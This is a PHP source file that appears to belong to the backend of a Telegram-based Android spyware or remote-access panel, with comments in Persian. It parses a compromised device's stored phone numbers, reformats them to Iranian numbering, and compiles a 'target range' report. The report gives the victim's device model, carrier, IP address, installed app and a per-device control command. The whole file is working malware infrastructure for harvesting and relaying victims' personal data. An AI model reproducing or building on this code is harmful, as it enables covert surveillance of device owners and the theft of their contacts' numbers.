<?php
function extractPhoneNumbers($filePath) {
    $content = file_get_contents($filePath);
    $lines = explode("\n", $content);
    $phoneNumbers = [];
    
    foreach ($lines as $line) {
        if (strpos($line, 'Phone :') !== false) {
            $phone = trim(str_replace('Phone :', '', $line));
            if (!empty($phone) && $phone != '200' && $phone != '2222' && $phone != '110' && $phone != '115' && $phone != '125') {
                // تبدیل شماره به فرمت 0xxxxxxxxxx
                $cleanNum = preg_replace('/[^0-9]/', '', $phone);
                
                // تبدیل به فرمت 0xxxxxxxxxx
                if (substr($cleanNum, 0, 2) == '98') {
                    $cleanNum = '0' . substr($cleanNum, 2);
                } elseif (substr($cleanNum, 0, 1) != '0' && strlen($cleanNum) == 10) {
                    $cleanNum = '0' . $cleanNum;
                }
                
                $phoneNumbers[] = $cleanNum;
            }
        }
    }
    
    return array_unique($phoneNumbers);
}

function processRange($filePath, $model, $operator, $ip, $device_id) {
    $app = file_get_contents("user/appname-$device_id.txt");
    $phoneNumbers = extractPhoneNumbers($filePath);
    $targetName = file_exists("user/{$device_id}-name.txt") ? 
                 file_get_contents("user/{$device_id}-name.txt") : 
                 "Unknown";
    
    $result = "❄️ ᴛᴀʀɢᴇᴛ ʀᴀɴɢᴇ\n";
    $result .= "☎️ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀꜱ : \n\n";

    if (count($phoneNumbers) > 0) {
        $result .= "<code>" . implode("\n", $phoneNumbers) . "</code>\n\n";
        $result .= "📊 ᴛᴏᴛᴀʟ ɴᴜᴍʙᴇʀꜱ : <code>" . count($phoneNumbers) . "</code>\n\n";
    } else {
        $result .= "❌ شماره ای یافت نشد\n\n";
    }
    
    $result .= "┌ <b>ᴅᴇᴠɪᴄᴇ</b>: <code>$model</code>\n";
    $result .= "├ <b>ɴᴇᴛᴡᴏʀᴋ</b>: <code>$operator</code>\n";
    $result .= "├ <b>ᴀᴅᴅʀᴇꜱꜱ</b>: <code>$ip</code>\n";
    $result .= "├ <b>ᴘᴀɴᴇʟ</b>: /set_$device_id\n";
    $result .= "└ <b>ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ</b>: <code>$app</code>\n\n";
    $result .= "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>";
    
    return $result;
}
?>